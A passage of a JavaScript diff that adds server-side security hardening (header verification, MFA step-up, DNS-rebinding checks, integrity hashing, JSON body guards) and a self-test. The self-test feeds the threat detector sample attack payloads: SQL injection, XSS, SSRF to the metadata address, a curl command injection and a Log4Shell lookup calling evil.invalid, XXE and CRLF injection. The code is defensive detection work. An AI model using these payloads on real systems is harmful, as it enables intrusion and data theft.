+  if (!session) return { ok: false, reason: 'device_credential_session_missing' };
+  const cookies = typeof parseCookies === 'function' ? parseCookies(req) : {};
+  const name = diracCentralDeviceCookieNameV221();
+  const token = String(cookies && cookies[name] || '').trim();
+  if (!token) {
+    try {
+      const issued = diracCentralDeviceTokenV221(req);
+      appendSetCookie(res, makeCookie(name, issued, { maxAge: 24 * 60 * 60, domain: '' }));
+      return { ok: true, issued: true };
+    } catch (_) {
+      return { ok: false, reason: 'device_credential_issue_failed' };
+    }
+  }
+  return diracCentralVerifyDeviceTokenV221(req, token);
+}
+
+function diracCentralS2SEnvelopeGuardV221(req, ctx) {
+  if (!diracS2SIsInternalActionV206(ctx)) return { ok: true };
+  const required = {
+    server: diracS2SHeaderV206(req, 'x-dirac-server-id'),
+    target: diracS2SHeaderV206(req, 'x-dirac-target-server-id'),
+    version: diracS2SHeaderV206(req, 'x-dirac-s2s-version'),
+    policy: diracS2SHeaderV206(req, 'x-dirac-s2s-policy'),
+    keyVersion: diracS2SHeaderV206(req, 'x-dirac-key-version'),
+    timestamp: diracS2SHeaderV206(req, 'x-dirac-timestamp'),
+    nonce: diracS2SHeaderV206(req, 'x-dirac-nonce'),
+    requestId: diracS2SHeaderV206(req, 'x-dirac-request-id'),
+    bodyHash: diracS2SHeaderV206(req, 'x-dirac-body-sha512')
+  };
+  if (!diracS2SIdV206(required.server) || !diracS2SIdV206(required.target) || !diracS2SKeyVersionV206(required.keyVersion)) return { ok: false, reason: 's2s_v221_identity_shape_invalid' };
+  if (required.version !== DIRAC_S2S_VERSION_V206 || required.policy !== DIRAC_S2S_POLICY_V206) return { ok: false, reason: 's2s_v221_version_policy_invalid' };
+  if (!/^\d{13}$/.test(required.timestamp) || Math.abs(Date.now() - Number(required.timestamp)) > Math.min(Number(DIRAC_S2S_MAX_CLOCK_SKEW_MS_V206 || 60000), 60000)) {
+    return { ok: false, reason: 's2s_v221_timestamp_invalid' };
+  }
+  if (!/^[A-Za-z0-9_-]{32,160}$/.test(required.nonce) || !/^[A-Za-z0-9_-]{24,160}$/.test(required.requestId) || !/^[a-f0-9]{128}$/i.test(required.bodyHash)) {
+    return { ok: false, reason: 's2s_v221_request_binding_invalid' };
+  }
+  const headers = req && req.headers || {};
+  if (headers['x-dirac-alg'] || headers['x-dirac-jku'] || headers['x-dirac-x5u']) return { ok: false, reason: 's2s_v221_algorithm_override_rejected' };
+  return { ok: true };
+}
+
+function diracCentralAdminStepUpGuardV221(req, ctx) {
+  if (ctx.classification !== 'admin' || !['POST', 'PUT', 'PATCH', 'DELETE'].includes(ctx.method)) return { ok: true };
+  const mfa = diracCentralMfaEnvelopeV221(req, ctx);
+  if (!mfa.ok) return { ok: false, reason: mfa.reason || 'admin_step_up_mfa_invalid' };
+  if (Date.now() - Number(mfa.payload.activeAtMs || 0) > 10 * 60 * 1000) return { ok: false, reason: 'admin_step_up_too_old' };
+  return { ok: true };
+}
+
+function diracCentralOwnershipPostconditionV221(ctx) {
+  if (!ctx || !ctx.policy || ctx.policy.ownership !== true) return { ok: true };
+  if (ctx.classification === 'server' || ctx.classification === 'public_read') return { ok: true };
+  if (diracCentralVerifiedOwnerActionV217(ctx.action)) {
+    const owner = diracCentralOwnerFromStage26V217(ctx);
+    if (!owner || owner.ok !== true || !diracCentralLooksLikeUuidV146(owner.authUserId)
+        || !Array.isArray(owner.customerIds) || owner.customerIds.length !== 1
+        || !diracCentralLooksLikeUuidV146(owner.customerIds[0])) {
+      return { ok: false, reason: 'v221_verified_owner_postcondition_failed' };
+    }
+  }
+  return { ok: true };
+}
+
+function diracCentralGuardBudgetMsV221(ctx) {
+  return ctx && ctx.classification === 'server' ? 60 * 1000 : 30 * 1000;
+}
+
+function diracCentralEgressTimeoutMsV221() {
+  const raw = Number(process.env.DIRAC_EGRESS_TIMEOUT_MS || 25000);
+  return Number.isFinite(raw) ? Math.max(3000, Math.min(60000, Math.floor(raw))) : 25000;
+}
+
+function diracCentralTimeoutOptionsV221(options) {
+  const base = Object.assign({}, options || {});
+  const controller = new AbortController();
+  const timeoutMs = diracCentralEgressTimeoutMsV221();
+  let upstreamListener = null;
+  if (base.signal) {
+    if (base.signal.aborted) controller.abort(base.signal.reason);
+    else {
+      upstreamListener = () => controller.abort(base.signal.reason);
+      base.signal.addEventListener('abort', upstreamListener, { once: true });
+    }
+  }
+  const timer = setTimeout(() => {
+    const error = new Error('DIRAC_EGRESS_TIMEOUT');
+    error.code = 'DIRAC_EGRESS_TIMEOUT';
+    controller.abort(error);
+  }, timeoutMs);
+  if (typeof timer.unref === 'function') timer.unref();
+  base.signal = controller.signal;
+  return {
+    options: base,
+    cleanup() {
+      clearTimeout(timer);
+      try { if (upstreamListener && options && options.signal) options.signal.removeEventListener('abort', upstreamListener); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+    }
+  };
+}
+
+async function diracCentralFreshDnsV221(host) {
+  try {
+    const dns = require('dns').promises;
+    const rows = await Promise.race([
+      dns.lookup(String(host || ''), { all: true, verbatim: true }),
+      new Promise((resolve) => setTimeout(() => resolve([]), 1500))
+    ]);
+    return Array.from(new Set((rows || []).map((row) => String(row && row.address || '')).filter(Boolean))).slice(0, 32);
+  } catch (_) {
+    return [];
+  }
+}
+
+async function diracCentralDnsRebindingGuardV221(host, firstIps) {
+  const second = await diracCentralFreshDnsV221(host);
+  if (!second.length || second.some(diracCentralIsUnsafeIpV146)) return { ok: false, reason: 'egress_dns_rebinding_or_private_ip' };
+  const first = new Set((firstIps || []).map(String));
+  if (first.size && !second.some((ip) => first.has(ip))) return { ok: false, reason: 'egress_dns_answer_changed_without_overlap' };
+  return { ok: true, ips: second };
+}
+
+function diracCentralPipelineDescriptorRuntimeV221() {
+  return SECURITY_PIPELINE.map((entry) => String(entry.name) + ':' + String(entry.stamp)).join('|');
+}
+
+function diracCentralPipelineIntegrityV221(ctx) {
+  if (!Array.isArray(SECURITY_PIPELINE) || !Object.isFrozen(SECURITY_PIPELINE) || SECURITY_PIPELINE.length !== 30) return { ok: false, reason: 'v221_pipeline_shape_invalid' };
+  if (!Object.isFrozen(DIRAC_CENTRAL_PATCH_TARGETS_V221) || DIRAC_CENTRAL_PATCH_TARGETS_V221.length !== 22
+      || new Set(DIRAC_CENTRAL_PATCH_TARGETS_V221).size !== 22) return { ok: false, reason: 'v221_patch_target_manifest_invalid' };
+  const descriptor = diracCentralPipelineDescriptorRuntimeV221();
+  const hash = crypto.createHash('sha256').update(descriptor).digest('hex');
+  if (descriptor !== DIRAC_CENTRAL_PIPELINE_DESCRIPTOR_V221 || hash !== DIRAC_CENTRAL_PIPELINE_HASH_V221) return { ok: false, reason: 'v221_pipeline_manifest_mismatch' };
+  const names = new Set();
+  const stamps = new Set();
+  const guards = new Set();
+  for (const entry of SECURITY_PIPELINE) {
+    if (!entry || !Object.isFrozen(entry) || typeof entry.guard !== 'function' || names.has(entry.name) || stamps.has(entry.stamp) || guards.has(entry.guard)) {
+      return { ok: false, reason: 'v221_pipeline_duplicate_or_mutable_entry' };
+    }
+    names.add(entry.name);
+    stamps.add(entry.stamp);
+    guards.add(entry.guard);
+  }
+  for (const [name, fn] of Object.entries(DIRAC_CENTRAL_BAN_FUNCTIONS_V221)) {
+    const expectedHash = DIRAC_CENTRAL_BAN_FUNCTION_HASHES_V221[name];
+    const actualHash = crypto.createHash('sha256').update(Function.prototype.toString.call(fn)).digest('hex');
+    if (!expectedHash || actualHash !== expectedHash) return { ok: false, reason: 'v221_ban_function_changed_' + name };
+  }
+  const middlewareNames = __diracV202MiddlewareRegistry.map((entry) => String(entry && entry.name || ''));
+  if (middlewareNames.some((name) => !name) || new Set(middlewareNames).size !== middlewareNames.length) return { ok: false, reason: 'v221_middleware_registry_duplicate' };
+  for (const action of DIRAC_CENTRAL_ACTIVE_ACTIONS_V146) {
+    const contract = diracCentralContractForActionV146(action);
+    if (!contract || !Array.isArray(contract.methods) || !contract.methods.length) return { ok: false, reason: 'v221_action_contract_missing_' + action };
+  }
+  if (!readLimitedJsonBody || readLimitedJsonBody.__diracCentralRawJsonV221 !== true) return { ok: false, reason: 'v221_raw_json_guard_missing' };
+  const sourceUniqueness = diracCentralGuardSourceUniquenessV221();
+  if (!sourceUniqueness.ok) return sourceUniqueness;
+  if (!DIRAC_CENTRAL_SELF_TEST_V221 || DIRAC_CENTRAL_SELF_TEST_V221.ok !== true) return { ok: false, reason: 'v221_self_test_not_passed' };
+  if (ctx && diracCentralIsPreflightV221(ctx)) {
+    if (ctx.preflightValidatedV221 !== true) return { ok: false, reason: 'v221_preflight_integrity_missing' };
+    const proofs = ctx.preflightCheckpointProofsV221 && typeof ctx.preflightCheckpointProofsV221 === 'object' ? ctx.preflightCheckpointProofsV221 : {};
+    for (const stage of DIRAC_CENTRAL_PREFLIGHT_GUARD_STAGES_V221) {
+      if (!/^[a-f0-9]{64}$/.test(String(proofs[stage] || ''))) return { ok: false, reason: 'v221_preflight_checkpoint_proof_missing_' + stage };
+    }
+    if (Object.keys(proofs).length !== DIRAC_CENTRAL_PREFLIGHT_GUARD_STAGES_V221.length) return { ok: false, reason: 'v221_preflight_checkpoint_proof_count_invalid' };
+  }
+  return { ok: true };
+}
+
+function diracCentralSelfTestRunV221() {
+  const failures = [];
+  let assertions = 0;
+  const expect = (condition, name) => { assertions += 1; if (!condition) failures.push(name); };
+  const threat = (body, query = {}, action = 'security_report') => {
+    const ctx = { action, body, method: 'POST' };
+    const req = { url: '/api/health?action=' + encodeURIComponent(action), query: { action, ...query }, headers: {} };
+    return diracCentralContextualThreatGuardV221(req, ctx);
+  };
+
+  // Patch target manifest and pipeline lock.
+  expect(DIRAC_CENTRAL_PATCH_TARGETS_V221.length === 22, 'patch_target_count');
+  expect(new Set(DIRAC_CENTRAL_PATCH_TARGETS_V221).size === 22, 'patch_target_uniqueness');
+  expect(Object.isFrozen(DIRAC_CENTRAL_PATCH_TARGETS_V221), 'patch_target_manifest_frozen');
+  expect(DIRAC_CENTRAL_PREFLIGHT_GUARD_STAGES_V221.length === 19, 'preflight_guard_stage_count');
+  expect(Object.entries(DIRAC_CENTRAL_BAN_FUNCTIONS_V221).every(([name, fn]) =>
+    crypto.createHash('sha256').update(Function.prototype.toString.call(fn)).digest('hex') === DIRAC_CENTRAL_BAN_FUNCTION_HASHES_V221[name]), 'ban_functions_byte_locked');
+  const descriptorHash = crypto.createHash('sha256').update(DIRAC_CENTRAL_PIPELINE_DESCRIPTOR_V221).digest('hex');
+  expect(descriptorHash === DIRAC_CENTRAL_PIPELINE_HASH_V221, 'pipeline_hash_constant');
+
+  // Preflight is validated as a protocol state; it does not remove checkpoints.
+  const preflightBase = {
+    action: 'domain_login', method: 'OPTIONS',
+    headers: {
+      origin: 'https://diracgroup.store',
+      'access-control-request-method': 'POST',
+      'access-control-request-headers': 'content-type, x-csrf-token',
+      'sec-fetch-mode': 'cors'
+    }
+  };
+  expect(diracCentralValidatePreflightV221(preflightBase).ok === true, 'valid_preflight_acceptance');
+  expect(diracCentralValidatePreflightV221({ ...preflightBase, headers: { ...preflightBase.headers, 'access-control-request-headers': 'x-unknown-dangerous-header' } }).ok === false, 'unknown_preflight_header_rejection');
+  expect(diracCentralValidatePreflightV221({ ...preflightBase, headers: { ...preflightBase.headers, origin: 'https://evil.invalid' } }).ok === false, 'foreign_preflight_origin_rejection');
+  const proofCtx = {
+    ...preflightBase,
+    requestId: 'v221-selftest-preflight',
+    policy: ACTION_POLICY.domain_login,
+    headers: {
+      ...preflightBase.headers,
+      'access-control-request-headers': 'content-type, x-csrf-token, x-dirac-page-nonce'
+    }
+  };
+  const proofValidation = diracCentralValidatePreflightV221(proofCtx);
+  proofCtx.preflightValidatedV221 = proofValidation.ok;
+  proofCtx.preflightOriginV221 = proofValidation.origin;
+  proofCtx.preflightRequestedMethodV221 = proofValidation.requestedMethod;
+  proofCtx.preflightRequestedHeadersV221 = proofValidation.requestedHeaders;
+  proofCtx.preflightContextHashV221 = diracCentralPreflightContextHashV221(proofCtx);
+  proofCtx.preflightCheckpointProofsV221 = Object.create(null);
+  let proofChainOk = true;
+  DIRAC_CENTRAL_PREFLIGHT_GUARD_STAGES_V221.forEach((stage, index) => {
+    proofCtx.currentStageIndexV211 = index + 10;
+    if (!diracCentralVerifyPreflightCheckpointV221(proofCtx, stage).ok) proofChainOk = false;
+  });
+  expect(proofChainOk && Object.keys(proofCtx.preflightCheckpointProofsV221).length === 19, 'all_preflight_guards_execute_and_prove');
+  proofCtx.currentStageIndexV211 = 10;
+  expect(diracCentralVerifyPreflightCheckpointV221(proofCtx, 'server_authentication').ok === false, 'preflight_guard_replay_rejection');
+
+  // Failure taxonomy keeps authentication state distinguishable from confirmed attacks.
+  expect(diracCentralClassifyFailureV221('mfa_required', 'MFA').failureClass === 'authentication_state', 'mfa_failure_classification');
+  expect(diracCentralClassifyFailureV221('sql_injection', 'threat detection').failureClass === 'confirmed_attack', 'attack_failure_classification');
+  expect(diracCentralClassifyFailureV221('provider_timeout', 'circuit breaker').failureClass === 'security_dependency_failure', 'dependency_failure_classification');
+
+  // Canonicalization, JSON pollution and structural limits.
+  expect(diracCentralJsonDuplicateScanV221('{"a":1,"a":2}').duplicate === true, 'duplicate_json_detection');
+  expect(diracCentralJsonDuplicateScanV221('{"a":{"b":1,"b":2}}').duplicate === true, 'nested_duplicate_json_detection');
+  expect(diracCentralJsonDuplicateScanV221('{"a":1,"b":{"c":2}}').ok === true, 'valid_json_acceptance');
+  expect(diracCentralJsonDuplicateScanV221('{"a":1} trailing').malformed === true, 'json_trailing_data_rejection');
+  expect(diracCentralCanonicalVariantsV221('%253Cscript%253E').some((value) => /<script>/i.test(value)), 'multi_stage_canonicalization');
+  expect(diracCentralCanonicalVariantsV221('\uFF1Cscript\uFF1E').some((value) => /<script>/i.test(value)), 'unicode_nfkc_canonicalization');
+  expect(diracCentralPlainJsonStructureV221({ constructor: { prototype: true } }, 0, { nodes: 0 }).ok === false, 'prototype_key_structure_rejection');
+  let deep = {}; let cursor = deep;
+  for (let index = 0; index < 10; index += 1) { cursor.a = {}; cursor = cursor.a; }
+  expect(diracCentralPlainJsonStructureV221(deep, 0, { nodes: 0 }).ok === false, 'deep_structure_rejection');
+
+  // Benign corpus must remain benign.
+  const benignCtx = { action: 'domain_check', body: {}, method: 'GET' };
+  const benignReq = { url: '/api/health?action=domain_check&domain=metadata.com', query: { action: 'domain_check', domain: 'metadata.com' }, headers: {} };
+  expect(diracCentralContextualThreatGuardV221(benignReq, benignCtx).detected === false, 'metadata_domain_false_positive');
+  expect(threat({ reason: 'Read the localStorage documentation and constructor design notes.' }).detected === false, 'benign_security_words_false_positive');
+  expect(threat({ reason: 'Normal customer message: select the preferred perfume.' }).detected === false, 'benign_select_word_false_positive');
+
+  // High-confidence attack corpus.
+  expect(threat({ callback_url: 'http://169.254.169.254/latest/meta-data' }).kind === 'ssrf_private_or_metadata_target', 'ssrf_metadata_detection');
+  expect(threat({ callback_url: 'file:///etc/passwd' }).detected === true, 'ssrf_protocol_detection');
+  expect(threat({ reason: '<svg onload=alert(1)>' }).kind === 'xss', 'xss_detection');
+  expect(threat({ reason: "' UNION SELECT password FROM users--" }).kind === 'sql_injection', 'sqli_detection');
+  expect(threat({ reason: '; curl https://evil.invalid/x' }).kind === 'command_injection_rce', 'command_injection_detection');
+  expect(threat({ reason: '../../etc/passwd' }).kind === 'path_traversal_lfi_rfi', 'path_traversal_detection');
+  expect(threat({ reason: '{"$where":"sleep(10)"}' }).detected === true, 'nosql_injection_detection');
+  expect(threat({ reason: '<!DOCTYPE x [<!ENTITY y SYSTEM "file:///etc/passwd">]>' }).detected === true, 'xxe_detection');
+  expect(threat({ reason: '{{7*7}}' }).kind === 'ssti_template_injection', 'ssti_detection');
+  expect(threat({ reason: '${jndi:ldap://evil.invalid/a}' }).kind === 'log4shell', 'log4shell_detection');
+  expect(threat({ reason: '%0d%0aSet-Cookie:evil=1' }).kind === 'crlf_header_injection', 'crlf_detection');
+  expect(threat({ reason: 'constructor.prototype.polluted=true' }).kind === 'prototype_pollution', 'prototype_pollution_detection');
+
+  // Network, response and policy hardening.
+  expect(diracCentralIsUnsafeIpV146('127.0.0.1') === true, 'ipv4_loopback_rejection');
+  expect(diracCentralIsUnsafeIpV146('169.254.169.254') === true, 'ipv4_metadata_rejection');
+  expect(diracCentralIsUnsafeIpV146('::1') === true, 'ipv6_loopback_rejection');
+  expect(diracCentralIsUnsafeIpV146('8.8.8.8') === false, 'public_ip_acceptance');
+  expect(diracCentralRateProfileV221('domain_login').concurrent <= 3, 'login_concurrency_profile');
+  expect(diracCentralRateProfileV221('create_payment').concurrent <= 4, 'payment_concurrency_profile');
+  const mockRes = { setHeader() { return true; } };
+  diracCentralWrapResponseHeadersV221(mockRes);
+  let crlfRejected = false;
+  try { mockRes.setHeader('X-Test', 'safe\r\nInjected: yes'); } catch (_) { crlfRejected = true; }
+  expect(crlfRejected, 'response_header_crlf_rejection');
+  expect(diracCentralRecordSuppressedExceptionV221(Object.assign(new Error('redacted'), { code: 'SELFTEST' })) === true, 'suppressed_exception_telemetry');
+
+  return Object.freeze({
+    ok: failures.length === 0,
+    failures: Object.freeze(failures.slice()),
+    assertions,
+    targets: DIRAC_CENTRAL_PATCH_TARGETS_V221.length,
+    tested_at: new Date().toISOString(),
+    patch: DIRAC_CENTRAL_HARDENING_V221
+  });
+}
+
+try {
+  const __diracCentralReadLimitedJsonBodyBeforeV221 = typeof readLimitedJsonBody === 'function' ? readLimitedJsonBody : null;
+  if (!__diracCentralReadLimitedJsonBodyBeforeV221) throw new Error('DIRAC_V221_BODY_READER_MISSING');
+  if (!__diracCentralReadLimitedJsonBodyBeforeV221.__diracCentralRawJsonV221) {
+    readLimitedJsonBody = async function readLimitedJsonBodyCentralRawJsonV221(req, limitBytes) {
+      const limit = Math.max(1024, Number(limitBytes || LOGIN_SECURITY_BODY_LIMIT_BYTES || 16 * 1024));
+      if (req && Buffer.isBuffer(req.body)) req.body = req.body.toString('utf8');
+      if (req && req.body === undefined && req && typeof req.on === 'function' && !req.readableEnded) {
+        const raw = await new Promise((resolve, reject) => {
+          let chunks = [];
+          let total = 0;
+          let done = false;
+          const fail = (error) => { if (!done) { done = true; reject(error); } };
+          req.on('data', (chunk) => {
+            if (done) return;
+            const buffer = Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk);
+            total += buffer.length;
+            if (total > limit) {
+              const error = new Error('BODY_TOO_LARGE');
+              error.statusCode = 413;
+              error.code = 'BODY_TOO_LARGE';
+              fail(error);
+              return;
+            }
+            chunks.push(buffer);
+          });
+          req.on('end', () => { if (!done) { done = true; resolve(Buffer.concat(chunks).toString('utf8')); } });
+          req.on('error', fail);
+          req.on('aborted', () => { const error = new Error('BODY_ABORTED'); error.code = 'BODY_ABORTED'; fail(error); });
+        });
+        req.body = raw;
+      }
+      if (req && typeof req.body === 'string') {
+        if (Buffer.byteLength(req.body, 'utf8') > limit) {
+          const error = new Error('BODY_TOO_LARGE');
+          error.statusCode = 413;
+          error.code = 'BODY_TOO_LARGE';
+          throw error;
+        }
+        req.__diracRawJsonV221 = req.body;
+        const scan = diracCentralJsonDuplicateScanV221(req.body || '{}');
+        if (scan.duplicate) req.__diracRawJsonDuplicateV221 = scan.key || 'duplicate';
+        if (scan.malformed) req.__diracRawJsonMalformedV221 = scan.reason || 'malformed';
+        if (scan.duplicate) {
+          const error = new Error('DUPLICATE_JSON_KEY');
+          error.statusCode = 400;
+          error.code = 'DUPLICATE_JSON_KEY';
+          throw error;
+        }
+      }
+      return __diracCentralReadLimitedJsonBodyBeforeV221(req, limit);
+    };
+    Object.defineProperty(readLimitedJsonBody, '__diracCentralRawJsonV221', { value: true, enumerable: false });
+  }
+} catch (error) {
+  throw new Error('DIRAC_V221_BODY_READER_INSTALL_FAILED', { cause: error });
+}
+
+
+
+function diracCentralWrapResponseHeadersV221(res) {
+  if (!res || typeof res.setHeader !== 'function' || res.__diracHeaderGuardV221) return;
+  const original = res.setHeader.bind(res);
+  res.setHeader = function diracCentralSafeSetHeaderV221(name, value) {
+    const headerName = String(name || '');
+    if (!/^[!#$%&'*+\-.^_`|~0-9A-Za-z]{1,128}$/.test(headerName)) {
+      const error = new Error('DIRAC_RESPONSE_HEADER_NAME_REJECTED');
+      error.code = 'DIRAC_RESPONSE_HEADER_NAME_REJECTED';
+      throw error;
+    }
+    const values = Array.isArray(value) ? value : [value];
+    if (values.some((item) => /[\r\n\u0000]/.test(String(item === undefined || item === null ? '' : item)))) {
+      const error = new Error('DIRAC_RESPONSE_HEADER_VALUE_REJECTED');
+      error.code = 'DIRAC_RESPONSE_HEADER_VALUE_REJECTED';
+      throw error;
+    }
+    return original(headerName, value);
+  };
+  Object.defineProperty(res, '__diracHeaderGuardV221', { value: true, enumerable: false });
+}
+
+function diracCentralGuardSourceUniquenessV221() {
+  try {
+    const fs = require('fs');
+    const source = fs.readFileSync(__filename, 'utf8');
+    const centralMarker = source.indexOf('DIRAC CENTRAL SECURITY GUARD v146 - FINAL CENTRAL FLOW');
+    const centralSource = centralMarker >= 0 ? source.slice(centralMarker) : '';
+    const centralEmptyCatchCount = (centralSource.match(/catch\s*\([^)]*\)\s*\{\s*\}/g) || []).length;
+    if (!centralSource || centralEmptyCatchCount !== 3) {
+      return { ok: false, reason: 'v221_central_empty_catch_baseline_changed_' + centralEmptyCatchCount };
+    }
+    const requiredNames = [
+      'diracCentralContextualThreatGuardV221',
+      'diracCentralAdvancedContractGuardV221',
+      'diracCentralLayeredRateGuardV221',
+      'diracCentralMfaEnvelopeV221',
+      'diracCentralPipelineIntegrityV221'
+    ];
+    for (const name of requiredNames) {
+      const pattern = new RegExp('(?:function\\s+' + name + '\\s*\\(|const\\s+' + name + '\\s*=)', 'g');
+      const count = (source.match(pattern) || []).length;
+      if (count !== 1) return { ok: false, reason: 'v221_function_declaration_count_' + name + '_' + count };
+    }
+    const counts = new Map();
+    const declarationPattern = /^\s*(?:async\s+)?function\s+([A-Za-z_$][\w$]*)\s*\(/gm;
+    let match;
+    while ((match = declarationPattern.exec(source))) counts.set(match[1], Number(counts.get(match[1]) || 0) + 1);
+    const actualDuplicates = Array.from(counts.entries()).filter((entry) => entry[1] > 1).sort((a, b) => a[0].localeCompare(b[0]));
+    const expectedDuplicates = Object.entries(DIRAC_CENTRAL_LEGACY_DUPLICATE_FUNCTIONS_V221).sort((a, b) => a[0].localeCompare(b[0]));
+    if (JSON.stringify(actualDuplicates) !== JSON.stringify(expectedDuplicates)) {
+      return { ok: false, reason: 'v221_legacy_duplicate_baseline_changed' };
+    }
+    return { ok: true };
+  } catch (_) {
+    return { ok: false, reason: 'v221_source_uniqueness_unavailable' };
+  }
 }
 
 const SECURITY_PIPELINE = Object.freeze([
@@ -28334,7 +29569,7 @@ try {
     };
     Object.defineProperty(readLimitedJsonBody, '__diracCentralBodyCacheV146', { value: true, enumerable: false });
   }
-} catch (_) {}
+} catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
 
 try {
   const __diracCentralPreviousReadBodyV146 = typeof readBody === 'function' ? readBody : null;
@@ -28349,7 +29584,7 @@ try {
     };
     Object.defineProperty(readBody, '__diracCentralBodyCacheV146', { value: true, enumerable: false });
   }
-} catch (_) {}
+} catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
 
 try {
   const __diracCentralPreviousV107ShouldSkipV146 = typeof diracV107ShouldSkip === 'function' ? diracV107ShouldSkip : null;
@@ -28359,7 +29594,7 @@ try {
     };
     Object.defineProperty(diracV107ShouldSkip, '__diracCentralPassthroughV146', { value: true, enumerable: false });
   }
-} catch (_) {}
+} catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
 
 try {
   const __diracCentralPreviousV143ThreatV146 = typeof diracV143DetectRequestThreat === 'function' ? diracV143DetectRequestThreat : null;
@@ -28369,7 +29604,7 @@ try {
     };
     Object.defineProperty(diracV143DetectRequestThreat, '__diracCentralPassthroughV146', { value: true, enumerable: false });
   }
-} catch (_) {}
+} catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
 
 try {
   const __diracCentralPreviousV143InspectOwnershipV146 = typeof diracV143InspectOwnership === 'function' ? diracV143InspectOwnership : null;
@@ -28379,7 +29614,7 @@ try {
     };
     Object.defineProperty(diracV143InspectOwnership, '__diracCentralPassthroughV146', { value: true, enumerable: false });
   }
-} catch (_) {}
+} catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
 
 try {
   const __diracCentralPreviousSupabaseFetchV146 = typeof supabaseFetch === 'function' ? supabaseFetch : null;
@@ -28404,12 +29639,12 @@ try {
         const fetchPromise = __diracCentralPreviousSupabaseFetchV146(path, options)
           .then((result) => {
             if (!result || result.ok !== true) {
-              try { ctx.__diracCentralSupabaseRequestCacheV151.delete(requestCacheKey); } catch (_) {}
+              try { ctx.__diracCentralSupabaseRequestCacheV151.delete(requestCacheKey); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
             }
             return diracCentralCloneSupabaseResultV151(result);
           })
           .catch((error) => {
-            try { ctx.__diracCentralSupabaseRequestCacheV151.delete(requestCacheKey); } catch (_) {}
+            try { ctx.__diracCentralSupabaseRequestCacheV151.delete(requestCacheKey); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
             throw error;
           });
 
@@ -28456,6 +29691,82 @@ try {
   }
 } catch (error) {
   throw new Error('DIRAC_CENTRAL_EGRESS_GUARD_INSTALL_FAILED', { cause: error });
+}
+
+
+/* v221 final body-reader seal: installed after every legacy body wrapper. */
+try {
+  const __diracCentralFinalReadLimitedJsonBodyV221 = typeof readLimitedJsonBody === 'function' ? readLimitedJsonBody : null;
+  if (!__diracCentralFinalReadLimitedJsonBodyV221) throw new Error('DIRAC_V221_FINAL_BODY_READER_MISSING');
+  if (!__diracCentralFinalReadLimitedJsonBodyV221.__diracCentralRawJsonV221) {
+    readLimitedJsonBody = async function readLimitedJsonBodyFinalSealV221(req, limitBytes) {
+      const limit = Math.max(1024, Number(limitBytes || LOGIN_SECURITY_BODY_LIMIT_BYTES || 16 * 1024));
+      if (req && Buffer.isBuffer(req.body)) req.body = req.body.toString('utf8');
+      if (req && req.body === undefined && typeof req.on === 'function') {
+        if (req.readableEnded) {
+          req.body = '';
+        } else {
+          req.body = await new Promise((resolve, reject) => {
+            const chunks = [];
+            let total = 0;
+            let completed = false;
+            const fail = (error) => {
+              if (completed) return;
+              completed = true;
+              reject(error);
+            };
+            req.on('data', (chunk) => {
+              if (completed) return;
+              const buffer = Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk);
+              total += buffer.length;
+              if (total > limit) {
+                const error = new Error('BODY_TOO_LARGE');
+                error.statusCode = 413;
+                error.code = 'BODY_TOO_LARGE';
+                fail(error);
+                return;
+              }
+              chunks.push(buffer);
+            });
+            req.on('end', () => {
+              if (completed) return;
+              completed = true;
+              resolve(Buffer.concat(chunks).toString('utf8'));
+            });
+            req.on('error', fail);
+            req.on('aborted', () => {
+              const error = new Error('BODY_ABORTED');
+              error.code = 'BODY_ABORTED';
+              fail(error);
+            });
+          });
+        }
+      }
+      if (req && typeof req.body === 'string') {
+        if (Buffer.byteLength(req.body, 'utf8') > limit) {
+          const error = new Error('BODY_TOO_LARGE');
+          error.statusCode = 413;
+          error.code = 'BODY_TOO_LARGE';
+          throw error;
+        }
+        req.__diracRawJsonV221 = req.body;
+        const scan = diracCentralJsonDuplicateScanV221(req.body || '{}');
+        if (scan.duplicate) {
+          req.__diracRawJsonDuplicateV221 = scan.key || 'duplicate';
+          const error = new Error('DUPLICATE_JSON_KEY');
+          error.statusCode = 400;
+          error.code = 'DUPLICATE_JSON_KEY';
+          throw error;
+        }
+        if (scan.malformed) req.__diracRawJsonMalformedV221 = scan.reason || 'malformed';
+      }
+      return __diracCentralFinalReadLimitedJsonBodyV221(req, limit);
+    };
+    Object.defineProperty(readLimitedJsonBody, '__diracCentralRawJsonV221', { value: true, enumerable: false });
+    Object.defineProperty(readLimitedJsonBody, '__diracCentralFinalSealV221', { value: true, enumerable: false });
+  }
+} catch (error) {
+  throw new Error('DIRAC_V221_FINAL_BODY_READER_INSTALL_FAILED', { cause: error });
 }
 
 const __diracV202CentralGuardHandler = async function diracCentralSecurityGuardWrapperV146(req, res, nextHandlerV202) {
@@ -28757,7 +30068,7 @@ function diracCentralSetCurrentContextV149(ctx) {
   try {
     const store = DIRAC_CENTRAL_ASYNC_CONTEXT_V149 && DIRAC_CENTRAL_ASYNC_CONTEXT_V149.getStore();
     if (store) store.ctx = ctx || null;
-  } catch (_) {}
+  } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
 }
 
 function diracCentralCurrentContextV149() {
@@ -28766,7 +30077,7 @@ function diracCentralCurrentContextV149() {
       const store = DIRAC_CENTRAL_ASYNC_CONTEXT_V149.getStore();
       if (store) return store.ctx || null;
     }
-  } catch (_) {}
+  } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
   return DIRAC_CENTRAL_CONTEXT_STACK_V146[DIRAC_CENTRAL_CONTEXT_STACK_V146.length - 1] || null;
 }
 
@@ -28815,7 +30126,11 @@ async function diracCentralSecurityGuardV146(req, res, nextHandler) {
     centralGuardFullyPassedV211: false,
     ownerResolutionDebugV212: null,
     serviceRoleDebugV212: null,
-    ownerBootstrapDebugV213: null
+    ownerBootstrapDebugV213: null,
+    preflightValidatedV221: false,
+    failureClassificationV221: null,
